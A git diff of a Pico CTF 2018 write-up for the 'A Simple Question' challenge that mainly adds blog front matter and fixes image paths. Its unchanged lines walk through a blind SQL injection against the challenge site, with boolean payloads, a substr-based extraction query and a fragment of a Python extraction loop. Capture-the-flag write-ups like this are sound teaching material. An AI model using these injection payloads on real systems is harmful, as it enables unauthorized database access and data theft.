@@ -1,17 +1,22 @@
-# A Simple Question
+---
+layout: posts
+title:  Pico CTF 2018 - A Simple Question
+date:   2018-09-27
+categories: [CTFs, pico18]
+---
+
+[~$ cd ..](/ctfs/pico18/2018/09/27/index.html)
 
 >There is a website running at http://2018shell1.picoctf.com:2644 (link).
->Try to see if you can answer its question. 
-
-### [~$ cd ..](../)
+>Try to see if you can answer its question.
 
 We are expected to answer the question "What is the answer?". What a broad issue!
 
-![site](site.png)
+![site](/assets/res/CTFs/pico18/simple_question/site.png)
 
 We quickly saw where was the problem by sending only a single quote:
 
-![inject](inject.png)
+![inject](/assets/res/CTFs/pico18/simple_question/inject.png)
 
 By looking at the HTML source code, we found that we could have the PHP source by reading `answer2.phps`:
 
@@ -50,11 +55,11 @@ we get a "You are so close".
 
 Let's try with a smarter payload: **' or (select count(*) from answers) > 0 or '"**
 
-![close](close.png)
+![close](/assets/res/CTFs/pico18/simple_question/close.png)
 
 and with: **' or (select count(*) from answers) > 1 or '"**
 
-![wrong](wrong.png)
+![wrong](/assets/res/CTFs/pico18/simple_question/wrong.png)
 
 Okay, then there is only one row.
 
@@ -87,7 +92,7 @@ The extraction script will send **' or (select substr(answer,x,1) from answers) 
 >	i+=1
 > ```
 
-Returned values are: **52,49,65,110,100,83,105,120,83,105,120,116,104,115**, which gives us: 
+Returned values are: **52,49,65,110,100,83,105,120,83,105,120,116,104,115**, which gives us:
 
 > ```python
 >print "".join(chr(x) for x in [52,49,65,110,100,83,105,120,83,105,120,116,104,115])
